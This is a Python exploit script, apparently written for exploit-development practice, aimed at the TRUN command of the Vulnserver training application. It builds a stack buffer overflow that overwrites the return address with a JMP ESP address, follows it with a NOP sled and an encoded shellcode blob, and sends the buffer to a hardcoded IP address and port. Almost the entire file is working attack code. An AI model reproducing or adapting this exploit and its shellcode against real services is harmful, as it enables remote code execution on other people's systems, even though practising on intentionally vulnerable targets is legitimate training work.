#!/bin/python

import socket
import sys

"""
	Author: m3z0diac
	Contact: hamzaelansari453@gmail.com
	Vulnserver buffer overflow Exploi
	vuln variable: TRUN
"""

vulnInput = "TRUN /.:/"
ip = "192.168.43.50"
port = 9999

shellcode = ("\xb8\xcd\x70\x0a\xb4\xda\xdd\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x0e\x03\x8e\x7e\xe8\x41\xec\x97\x6e"
"\xa9\x0c\x68\x0f\x23\xe9\x59\x0f\x57\x7a\xc9\xbf\x13\x2e\xe6"
"\x34\x71\xda\x7d\x38\x5e\xed\x36\xf7\xb8\xc0\xc7\xa4\xf9\x43"
"\x44\xb7\x2d\xa3\x75\x78\x20\xa2\xb2\x65\xc9\xf6\x6b\xe1\x7c"
"\xe6\x18\xbf\xbc\x8d\x53\x51\xc5\x72\x23\x50\xe4\x25\x3f\x0b"
"\x26\xc4\xec\x27\x6f\xde\xf1\x02\x39\x55\xc1\xf9\xb8\xbf\x1b"
"\x01\x16\xfe\x93\xf0\x66\xc7\x14\xeb\x1c\x31\x67\x96\x26\x86"
"\x15\x4c\xa2\x1c\xbd\x07\x14\xf8\x3f\xcb\xc3\x8b\x4c\xa0\x80"
"\xd3\x50\x37\x44\x68\x6c\xbc\x6b\xbe\xe4\x86\x4f\x1a\xac\x5d"
"\xf1\x3b\x08\x33\x0e\x5b\xf3\xec\xaa\x10\x1e\xf8\xc6\x7b\x77"
"\xcd\xea\x83\x87\x59\x7c\xf0\xb5\xc6\xd6\x9e\xf5\x8f\xf0\x59"
"\xf9\xa5\x45\xf5\x04\x46\xb6\xdc\xc2\x12\xe6\x76\xe2\x1a\x6d"
"\x86\x0b\xcf\x22\xd6\xa3\xa0\x82\x86\x03\x11\x6b\xcc\x8b\x4e"
"\x8b\xef\x41\xe7\x26\x0a\x02\xc8\x1f\x3f\x5b\xa0\x5d\x3f\x5a"
"\x8a\xeb\xd9\x36\xfc\xbd\x72\xaf\x65\xe4\x08\x4e\x69\x32\x75"
"\x50\xe1\xb1\x8a\x1f\x02\xbf\x98\xc8\xe2\x8a\xc2\x5f\xfc\x20"
"\x6a\x03\x6f\xaf\x6a\x4a\x8c\x78\x3d\x1b\x62\x71\xab\xb1\xdd"
"\x2b\xc9\x4b\xbb\x14\x49\x90\x78\x9a\x50\x55\xc4\xb8\x42\xa3"
"\xc5\x84\x36\x7b\x90\x52\xe0\x3d\x4a\x15\x5a\x94\x21\xff\x0a"
"\x61\x0a\xc0\x4c\x6e\x47\xb6\xb0\xdf\x3e\x8f\xcf\xd0\xd6\x07"
"\xa8\x0c\x47\xe7\x63\x95\x77\xa2\x29\xbc\x1f\x6b\xb8\xfc\x7d"
"\x8c\x17\xc2\x7b\x0f\x9d\xbb\x7f\x0f\xd4\xbe\xc4\x97\x05\xb3"
"\x55\x72\x29\x60\x55\x57")

# jmp esp address: 625011AF

buffer = vulnInput + "A"*2003 + "\xAF\x11\x50\x62" + "\x90"*50 + shellcode + '\x90'*(5005-2003-4-50-len(shellcode))

try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send(buffer)
	s.close()


except:

	print "\n[-] could not connect"
	sys.exit()